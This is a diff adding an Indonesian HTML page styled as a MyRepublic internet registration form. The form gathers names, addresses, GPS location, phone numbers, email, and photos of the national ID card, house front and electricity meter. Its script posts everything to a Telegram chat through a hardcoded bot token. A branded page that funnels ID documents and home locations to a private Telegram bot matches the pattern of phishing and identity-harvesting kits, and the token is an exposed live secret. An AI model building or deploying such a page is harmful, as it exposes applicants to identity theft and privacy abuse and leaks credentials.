@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Pendaftaran MyRepublic</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #e31e24 0%, #8a0c10 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+        .header {
+            background: #e31e24;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 5px solid #ffcc00;
+        }
+        .header h1 {
+            color: white;
+            font-size: 1.8rem;
+        }
+        .header p {
+            color: #ffcc00;
+            margin-top: 5px;
+            font-weight: bold;
+        }
+        .logo-area span {
+            font-size: 2rem;
+            background: white;
+            padding: 8px 15px;
+            border-radius: 40px;
+            color: #e31e24;
+            font-weight: bold;
+            display: inline-block;
+        }
+        .form-section {
+            padding: 30px 25px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #e31e24;
+        }
+        label i {
+            color: #ff8c00;
+            font-style: normal;
+        }
+        input, button {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 12px;
+            font-size: 1rem;
+        }
+        input:focus {
+            border-color: #e31e24;
+            outline: none;
+        }
+        .btn-location {
+            background: #e31e24;
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .coord-info {
+            background: #eef2f7;
+            padding: 10px;
+            border-radius: 12px;
+            font-size: 0.85rem;
+            margin-top: 10px;
+        }
+        .btn-submit {
+            background: #e31e24;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            margin-top: 15px;
+            border-radius: 40px;
+        }
+        .btn-submit:hover {
+            background: #b0181d;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            display: none;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+        .camera-guide {
+            background: #fff3e0;
+            border-left: 4px solid #ffcc00;
+            padding: 12px;
+            margin-top: 10px;
+            border-radius: 8px;
+            font-size: 0.8rem;
+        }
+        .camera-guide strong {
+            color: #e31e24;
+        }
+        footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 0.7rem;
+            color: #888;
+            background: #f4f4f4;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="logo-area"><span>MyRepublic</span></div>
+        <h1>FORMULIR PENDAFTARAN</h1>
+        <p>Internet Fiber Super Cepat • Tanpa Batas</p>
+    </div>
+    <div class="form-section">
+        <form id="registrationForm">
+            <div class="form-group">
+                <label>Nama Sesuai KTP <i>(huruf kapital)</i></label>
+                <input type="text" id="nama" placeholder="CONTOH: BUDI SANTOSO" style="text-transform: uppercase;" required>
+            </div>
+            <div class="form-group">
+                <label>Alamat lengkap pemasangan <i>(huruf kapital)</i></label>
+                <input type="text" id="alamat" placeholder="JL. MERDEKA NO 10, RT 01 RW 05" style="text-transform: uppercase;" required>
+            </div>
+            <div class="form-group">
+                <label>Share Lokasi <i>(klik tombol ambil koordinat)</i></label>
+                <button type="button" id="getLocationBtn" class="btn-location">📍 Ambil Lokasi Titik Koordinat</button>
+                <div id="coordDisplay" class="coord-info">Belum diambil</div>
+                <input type="hidden" id="coordinates" value="">
+            </div>
+            <div class="form-group">
+                <label>Nomor HP yang aktif</label>
+                <input type="tel" id="hpAktif" placeholder="081234567890" required>
+            </div>
+            <div class="form-group">
+                <label>Nomor HP alternatif</label>
+                <input type="tel" id="hpAlt" placeholder="(opsional)">
+            </div>
+            <div class="form-group">
+                <label>Email <i>(huruf kecil)</i></label>
+                <input type="email" id="email" placeholder="nama@gmail.com" style="text-transform: lowercase;" required>
+            </div>
+            <div class="form-group">
+                <label>Foto KTP <i>(buka kamera atau gallery)</i></label>
+                <input type="file" id="fotoKTP" accept="image/*" capture="environment" required>
+            </div>
+            <div class="form-group">
+                <label>Foto rumah tampak depan <i>(buka kamera atau gallery)</i></label>
+                <input type="file" id="fotoRumah" accept="image/*" capture="environment" required>
+                <div class="camera-guide">
+                    <strong>📸 Panduan foto rumah:</strong> Ambil dari depan rumah, pastikan nomor rumah terlihat jelas, rumah tampak penuh dari pagar hingga atap.
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Foto meteran listrik <i>(buka kamera atau gallery)</i></label>
+                <input type="file" id="fotoMeter" accept="image/*" capture="environment">
+            </div>
+            <button type="submit" class="btn-submit">🚀 KIRIM PENDAFTARAN</button>
+            <div id="statusMessage" class="status"></div>
+        </form>
+    </div>
+    <footer>© MyRepublic | Data akan dikirim ke petugas via Telegram</footer>
+</div>
+
+<script>
+    const BOT_TOKEN = '8753359001:AAEs0yqaeSQY8W05AemyAQ85KeE64Hle-Pw';
+    const CHAT_ID = '-1003990221523';
+
+    const form = document.getElementById('registrationForm');
+    const getLocationBtn = document.getElementById('getLocationBtn');
+    const coordDisplay = document.getElementById('coordDisplay');
+    const coordInput = document.getElementById('coordinates');
+    const statusDiv = document.getElementById('statusMessage');
+
+    getLocationBtn.addEventListener('click', () => {
+        if (!navigator.geolocation) {
+            alert('Browser tidak mendukung geolokasi');
+            return;
+        }
+        getLocationBtn.disabled = true;
+        getLocationBtn.innerText = 'Mengambil lokasi...';
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const coordText = `Latitude: ${lat}, Longitude: ${lng}\nGoogle Maps: https://maps.google.com/?q=${lat},${lng}`;
+                coordDisplay.innerText = coordText;
+                coordInput.value = `${lat},${lng}`;
+                getLocationBtn.disabled = false;
+                getLocationBtn.innerText = '📍 Ambil Lokasi Titik Koordinat';
+            },
+            (error) => {
+                alert('Gagal ambil lokasi: ' + error.message);
+                getLocationBtn.disabled = false;
+                getLocationBtn.innerText = '📍 Ambil Lokasi (coba lagi)';
+            }
+        );
+    });
+
+    async function sendToTelegramText(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const payload = {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        };
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        return response.ok;
+    }
+
+    async function sendPhotoToTelegram(fileInput, caption) {
+        if (!fileInput.files || fileInput.files.length === 0) return false;
+        const file = fileInput.files[0];
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', file);
+        if (caption) formData.append('caption', caption);
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        try {
+            const response = await fetch(url, { method: 'POST', body: formData });
+            return response.ok;
+        } catch (err) {
+            return false;
+        }
+    }
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const nama = document.getElementById('nama').value.trim();
+        const alamat = document.getElementById('alamat').value.trim();
+        const koordinat = coordInput.value;
+        const hpAktif = document.getElementById('hpAktif').value.trim();
+        const hpAlt = document.getElementById('hpAlt').value.trim();
+        const email = document.getElementById('email').value.trim().toLowerCase();
+        const fotoKTP = document.getElementById('fotoKTP');
+        const fotoRumah = document.getElementById('fotoRumah');
+        const fotoMeter = document.getElementById('fotoMeter');
+
+        if (!nama || !alamat || !hpAktif || !email) {
+            statusDiv.className = 'status error';
+            statusDiv.innerText = '⚠️ Harap isi semua field wajib';
+            return;
+        }
+        if (!koordinat) {
+            statusDiv.className = 'status error';
+            statusDiv.innerText = '⚠️ Silakan klik tombol "Ambil Lokasi" terlebih dahulu';
+            return;
+        }
+        if (!fotoKTP.files.length) {
+            statusDiv.className = 'status error';
+            statusDiv.innerText = '⚠️ Harap unggah foto KTP';
+            return;
+        }
+        if (!fotoRumah.files.length) {
+            statusDiv.className = 'status error';
+            statusDiv.innerText = '⚠️ Harap unggah foto rumah tampak depan';
+            return;
+        }
+
+        const reportText = `
+📋 PENDAFTARAN MYREPUBLIC BARU
+━━━━━━━━━━━━━━━━━━━━━━━
+
+👤 Nama KTP : ${nama}
+🏠 Alamat Pasang : ${alamat}
+📍 Koordinat : ${koordinat}
+📞 HP Aktif : ${hpAktif}
+📱 HP Alternatif : ${hpAlt || '-'}
+✉️ Email : ${email}
+━━━━━━━━━━━━━━━━━━━━━━━
+📅 ${new Date().toLocaleString('id-ID')}
+        `.trim();
+
+        statusDiv.className = 'status';
+        statusDiv.innerText = '📡 Mengirim data ke petugas MyRepublic...';
+        statusDiv.style.display = 'block';
+
+        try {
+            const textSuccess = await sendToTelegramText(reportText);
+            if (!textSuccess) throw new Error('Gagal kirim teks');
+
+            await sendPhotoToTelegram(fotoKTP, '📸 FOTO KTP');
+            await sendPhotoToTelegram(fotoRumah, '🏠 FOTO RUMAH TAMPAK DEPAN');
+            
+            if (fotoMeter.files.length) {
+                await sendPhotoToTelegram(fotoMeter, '⚡ FOTO METERAN LISTRIK');
+            }
+
+            statusDiv.className = 'status success';
+            statusDiv.innerText = '✅ Pendaftaran berhasil terkirim! Petugas akan menghubungi Anda.';
+            form.reset();
+            coordDisplay.innerText = 'Belum diambil';
+            coordInput.value = '';
+            document.getElementById('fotoKTP').value = '';
+            document.getElementById('fotoRumah').value = '';
+            document.getElementById('fotoMeter').value = '';
+        } catch (error) {
+            statusDiv.className = 'status error';
+            statusDiv.innerText = '❌ Gagal mengirim ke Telegram. Coba lagi.';
+        }
+    });
+</script>
+</body>
+</html>
+EOF
+
+echo ""
+echo "✅ File index.html untuk MyRepublic berhasil dibuat!"
+echo "📁 Sekarang klik tombol 'Run' di Replit untuk melihat form."
